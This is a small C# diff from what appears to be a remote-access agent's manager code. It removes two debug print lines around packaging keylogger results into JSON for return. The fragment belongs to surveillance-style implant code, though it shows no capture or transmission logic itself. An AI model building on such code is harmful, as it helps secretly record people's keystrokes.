@@ -163,8 +163,6 @@ namespace Agent.Managers
                 };
 
                 krr.Prepare();
-                Console.WriteLine("Adding Keylogger Results");
-                Console.WriteLine(krr.keylogs.Count());
                 returnResults.Add(krr.ToJson());
                 klLogs.Clear();
             }
